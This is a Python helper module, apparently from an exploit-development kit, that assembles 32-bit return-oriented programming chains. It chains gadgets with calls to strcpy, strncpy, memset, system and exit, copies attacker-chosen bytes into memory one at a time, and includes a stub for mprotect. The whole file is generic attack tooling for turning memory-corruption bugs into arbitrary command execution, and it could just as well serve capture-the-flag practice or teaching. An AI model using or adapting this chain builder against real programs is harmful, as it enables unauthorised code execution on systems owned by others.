#!/bin/python3

from payload import *
import inspect


class RopChain():
    def strcpy(self, dest, src):
        payload = b""
        payload += getfunction("strcpy")
        payload += getgadget("pop2ret")
        payload += set32(dest)
        payload += set32(src)
        return payload

    def strncpy(self, dest, src):
        payload = b""
        payload += getfunction("strncpy")
        payload += getgadget("pop3ret")
        payload += set32(dest)
        payload += set32(src)
        payload += set32(0xffffffff)
        return payload

    def memset(self, dest, by):
        payload = b""
        payload += getfunction("memset")
        payload += getgadget("pop3ret")
        payload += set32(dest)
        payload += set32(by & ~0xff)
        payload += set32(1)
        return payload

    # def mprotect(functions, page_addr):
        # size = 0x2000
        # perms = 0x7
        # rop = b""
        # rop += set32(

    def system(self, s):
        payload = b""
        payload += getfunction("system")
        payload += getgadget("popret")
        payload += set32(s)
        return payload

    def exit(self):
        return getfunction("exit")


def copybytes(dest, addr_bytes):
    if "strcpy" in functions.keys():
        func = chain.strcpy
    elif "strncpy" in functions.keys():
        func = chain.strncpy
    else:
        die("function strcpy or strncpy not found, set one address first")

    payload = b""
    for addr in addr_bytes:
        payload += func(dest, addr)
        dest += 1
    return payload


def memsetbytes(dest, data):
    payload = b""
    for by in data:
        payload += chain.memset(dest, by)
        dest += 1
    return payload


def jump(addr):
    return set32(addr)


def getgadget(name):
    if name in gadgets.keys():
        return set32(gadgets[name])
    caller = inspect.stack()[1][3]
    die("%s needs gadget '%s', please set an address first" % (caller, name))


def getfunction(name):
    if name in functions.keys():
        return set32(functions[name])
    die("function '%s' not found, set her address first" % name)


gadgets = {}
functions = {}
chain = RopChain()

